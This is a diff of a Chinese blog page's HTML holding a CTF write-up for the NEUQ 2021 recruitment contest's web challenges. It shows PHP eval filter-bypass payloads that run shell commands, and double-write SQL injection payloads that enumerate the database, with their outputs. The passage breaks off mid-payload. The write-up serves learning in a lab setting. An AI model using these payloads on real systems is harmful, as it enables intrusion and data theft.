@@ -1,536 +1,222 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '7.5.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"always","offset":12,"onmobile":false},
-    copycode: {"enable":true,"show_result":true,"style":"mac"},
-    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    sidebarPadding: 40
-  };
-</script>
-
-  <meta name="description" content="Result9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。easy_eval123456&lt;?phpshow_source(__FILE__);if(preg_match(&quot;&#x2F;system|flag&#x2F;&quot; , $_GET[&quot;id&quot;]))&amp;#123;    die(&quot;">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="attpower"><meta name="copyright" content="attpower"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>neuq 2021 招新赛web | attpower的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script>document.addEventListener("DOMContentLoaded", () => {
+  Yun.utils.renderKatex();
+});</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"yglsaltfish.github.io","root":"/","title":"attpower的小站","version":"1.6.2","mode":"dark","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="Result 9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。 easy_eval &lt;?php show_source(__FILE__); if(preg_match(&quot;&#x2F;system|flag&#x2F;&quot; , $_GET[&quot;id&quot;]))&amp;#123;     die(&quot;no system or flag!!&quot;);">
 <meta property="og:type" content="article">
 <meta property="og:title" content="neuq 2021 招新赛web">
 <meta property="og:url" content="https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/index.html">
 <meta property="og:site_name" content="attpower的小站">
-<meta property="og:description" content="Result9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。easy_eval123456&lt;?phpshow_source(__FILE__);if(preg_match(&quot;&#x2F;system|flag&#x2F;&quot; , $_GET[&quot;id&quot;]))&amp;#123;    die(&quot;">
+<meta property="og:description" content="Result 9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。 easy_eval &lt;?php show_source(__FILE__); if(preg_match(&quot;&#x2F;system|flag&#x2F;&quot; , $_GET[&quot;id&quot;]))&amp;#123;     die(&quot;no system or flag!!&quot;);">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-08-29T13:30:06.000Z">
 <meta property="article:modified_time" content="2021-08-29T14:50:13.428Z">
 <meta property="article:author" content="attpower">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="attpower"><img width="96" loading="lazy" src="/king.png" alt="attpower"><span class="site-author-status" title="永远相信美好的事情即将发生">😊</span></a><div class="site-author-name"><a href="/about/">attpower</a></div><span class="site-name">attpower的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">22</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/yglsaltfish" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=481491384" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/ding-ge-shun-jian-47/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/85419687" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ATT_POWER" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#result"><span class="toc-text">Result</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_eval"><span class="toc-text">easy_eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#check_in_sql"><span class="toc-text">check_in_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_ping"><span class="toc-text">easy_ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_include"><span class="toc-text">easy_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_shell"><span class="toc-text">easy_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%96%B0oj%E4%B8%8A%E7%BA%BF%E8%BE%A3"><span class="toc-text">全新OJ上线辣</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="attpower"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="attpower的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">neuq 2021 招新赛web</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-08-29 21:30:06" itemprop="dateCreated datePublished" datetime="2021-08-29T21:30:06+08:00">2021-08-29</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">1.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">6m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="result">Result</h2>
+<p>9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。</p>
+<h2 id="easy_eval">easy_eval</h2>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|flag/"</span> <span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no system or flag!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+<p>这道题目就是一个简单的命令执行，发现把system和flag过滤掉了，那直接使用字符拼接就能完成。 <pre class="language-php" data-language="php"><code class="language-php">payload1<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;ls -a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<link rel="canonical" href="https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/">
+结果<span class="token punctuation">:</span>发现存在flaGGggGg<span class="token operator">.</span>txt文件，直接打开就行了。 
 
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>neuq 2021 招新赛web | attpower的小站</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-
-
-
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">attpower的小站</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    
-
-  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="attpower">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="attpower的小站">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          neuq 2021 招新赛web
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-08-29 21:30:06 / 修改时间：22:50:13" itemprop="dateCreated datePublished" datetime="2021-08-29T21:30:06+08:00">2021-08-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="result">Result</h2><p>9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。</p><h2 id="easy_eval">easy_eval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|flag/&quot;</span> , <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no system or flag!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br></pre></td></tr></table></figure><a id="more"></a>
-
-
-
-<p>这道题目就是一个简单的命令执行，发现把system和flag过滤掉了，那直接使用字符拼接就能完成。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload1:?id=<span class="variable">$a</span>=<span class="string">&quot;sys&quot;</span>;<span class="variable">$b</span>=<span class="string">&quot;tem&quot;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&quot;cd /;ls -a&quot;</span>);</span><br><span class="line"></span><br><span class="line">结果:发现存在flaGGggGg.txt文件，直接打开就行了。 </span><br><span class="line"></span><br><span class="line">payload2:?id=<span class="variable">$a</span>=<span class="string">&quot;sys&quot;</span>;<span class="variable">$b</span>=<span class="string">&quot;tem&quot;</span>;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&quot;cd /;cat flaGGggGg&quot;</span>); </span><br><span class="line">得到答案:flag&#123;<span class="number">0</span>cc175b9c0f12fd62f2e39dfbtahfa&#125;</span><br></pre></td></tr></table></figure></p>
+payload2<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;cat flaGGggGg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+得到答案<span class="token punctuation">:</span>flag<span class="token punctuation">&#123;</span><span class="token number">0</span>cc175b9c0f12fd62f2e39dfbtahfa<span class="token punctuation">&#125;</span></code></pre></p>
 <h2 id="check_in_sql">check_in_sql</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;sql&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = preg_replace(<span class="string">&quot;/select/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;sql&quot;</span>]);</span><br><span class="line">    <span class="comment">// var_dump($sql);</span></span><br><span class="line">    <span class="variable">$r</span> = mysqli_query(<span class="variable">$mysqli</span>,<span class="variable">$sql</span>.<span class="string">&quot;LionTreeNB&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span> &amp;&amp; <span class="variable">$r</span>-&gt;num_rows)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$r</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">            var_dump(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// var_dump($sql);</span>
+    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">"LionTreeNB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 <p>这道题目就是一个简单的sql注入题，注意使用双写绕过就行。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload1: ?<span class="keyword">sql</span><span class="operator">=</span>selselectect <span class="number">1</span>,version(),database()</span><br><span class="line">结果:<span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="number">1</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">1</span>) &quot;1&quot; [&quot;version()&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">23</span>) &quot;5.7.26-0ubuntu0.18.04.1&quot; [&quot;LionTreeNB&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">3</span>) &quot;web&quot; &#125;</span><br><span class="line">发现有回显，并且发现web数据库</span><br><span class="line"></span><br><span class="line">payload2: <span class="keyword">sql</span><span class="operator">=</span>selselectect <span class="number">1</span>,(selselectect group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;web&#x27;</span>)</span><br><span class="line">结果:<span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">1</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">1</span>) &quot;1&quot; [&quot;LionTreeNB&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">5</span>) &quot;users&quot; &#125;</span><br><span class="line">发现有个users表</span><br><span class="line"></span><br><span class="line">payload3: ?<span class="keyword">sql</span><span class="operator">=</span>selselectect <span class="number">1</span>,(selselectect group_concat(column_name)<span 